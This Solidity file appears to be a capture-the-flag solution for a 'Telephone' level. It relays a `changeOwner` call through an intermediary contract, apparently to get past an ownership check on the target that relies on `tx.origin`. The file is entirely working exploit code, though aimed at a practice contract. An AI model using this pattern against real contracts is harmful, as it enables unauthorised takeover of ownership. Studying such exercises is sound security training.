// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import './Telephone.sol';

contract TelephoneSolution {
  Telephone private tel;
  address private owner;
 
  constructor(address _tel) public {
    tel = Telephone(_tel);
    owner = msg.sender;
  }

  function changeOwner(address newOwner) external {
    tel.changeOwner(newOwner);
  }
}